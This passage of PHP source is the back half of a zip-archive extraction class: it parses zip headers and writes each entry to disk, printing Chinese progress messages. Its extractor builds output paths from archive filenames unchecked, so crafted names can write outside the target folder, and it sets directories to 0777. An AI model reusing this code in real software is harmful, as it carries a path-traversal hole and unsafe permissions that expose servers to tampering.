   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  {
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name){
	$size = filesize($zip_name);

	if ($size < 277) $maximum_size = $size;
	else $maximum_size=277;

	@fseek($zip, $size-$maximum_size);
	$pos = ftell($zip); $bytes = 0x00000000;

	while ($pos < $size){
		$byte = @fread($zip, 1); $bytes=($bytes << 8) | ord($byte);
		if ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506){ $pos++;break;} $pos++;
	}

	$fdata=fread($zip,18);

	$data=@unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',$fdata);

	if ($data['comment_size'] != 0) $centd['comment'] = fread($zip, $data['comment_size']);
	else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
	$centd['disk_entries'] = $data['disk_entries'];
	$centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
	$centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
	return $centd;
  }

 function ExtractFile($header,$to,$zip){
	$header = $this->readfileheader($zip);

	if(substr($to,-1)!="/") $to.="/";
	if($to=='./') $to = '';
	$pth = explode("/",$to.$header['filename']);
	$mydir = '';
	for($i=0;$i<count($pth)-1;$i++){
		if(!$pth[$i]) continue;
		$mydir .= $pth[$i]."/";
		if((!is_dir($mydir) && @mkdir($mydir,0777)) || (($mydir==$to.$header['filename'] || ($mydir==$to && $this->total_folders==0)) && is_dir($mydir)) ){
			@chmod($mydir,0777);
			$this->total_folders ++;
			echo "目录: $mydir<br>";
		}
	}

	if(strrchr($header['filename'],'/')=='/') return;

	if (!($header['external']==0x41FF0010)&&!($header['external']==16)){
		if ($header['compression']==0){
			$fp = @fopen($to.$header['filename'], 'wb');
			if(!$fp) return(-1);
			$size = $header['compressed_size'];

			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp);
			touch($to.$header['filename'], $header['mtime']);
		}else{
			$fp = @fopen($to.$header['filename'].'.gz','wb');
			if(!$fp) return(-1);
			$binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
			Chr(0x00), time(), Chr(0x00), Chr(3));

			fwrite($fp, $binary_data, 10);
			$size = $header['compressed_size'];

			while ($size != 0){
				$read_size = ($size < 1024 ? $size : 1024);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}

			$binary_data = pack('VV', $header['crc'], $header['size']);
			fwrite($fp, $binary_data,8); fclose($fp);

			$gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress");
			if(!$gzp) return(-2);
			$fp = @fopen($to.$header['filename'],'wb');
			if(!$fp) return(-1);
			$size = $header['size'];

			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = gzread($gzp, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp); gzclose($gzp);

			touch($to.$header['filename'], $header['mtime']);
			@unlink($to.$header['filename'].'.gz');

		}
	}

	$this->total_files ++;
	echo "文件: $to$header[filename]<br>";
	return true;
 }
}
ob_end_flush();
